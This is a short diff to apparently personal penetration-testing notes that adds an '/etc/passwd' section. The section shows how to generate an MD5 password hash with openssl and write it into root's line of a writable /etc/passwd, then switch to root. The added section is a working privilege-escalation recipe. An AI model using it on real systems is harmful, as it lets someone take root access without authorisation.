@@ -22,3 +22,15 @@ sudo usermod -u 1003 tester01
 sudo su tester01 -c bash
 ls -la /tmp/tester
 ```
+
+/etc/passwd
+
+```shell
+# generating password
+openssl passwd -1 -salt ignite <password>
+# openssl passwd -1 -salt test1234
+# $1$ignite$7mPCsoeG29TKXrOoHJa0J1
+# replace root's password
+# root:$1$ignite$7mPCsoeG29TKXrOoHJa0J1:0:0:root:/root:/bin/bash
+# su root
+```
